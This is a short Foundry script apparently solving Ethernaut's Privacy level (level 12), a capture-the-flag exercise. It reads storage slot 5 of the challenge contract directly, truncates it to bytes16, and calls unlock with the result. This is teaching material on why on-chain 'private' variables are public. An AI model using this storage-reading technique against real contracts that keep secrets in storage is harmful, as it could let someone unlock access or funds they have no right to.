// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/12_Privacy.sol";

contract ExploitScript is Script {
    Privacy level12 = Privacy(your_challenge_address);

    function run() external {
        vm.startBroadcast();

        level12.unlock(bytes16(vm.load(address(level12), bytes32(uint256(5)))));

        vm.stopBroadcast();
    }
}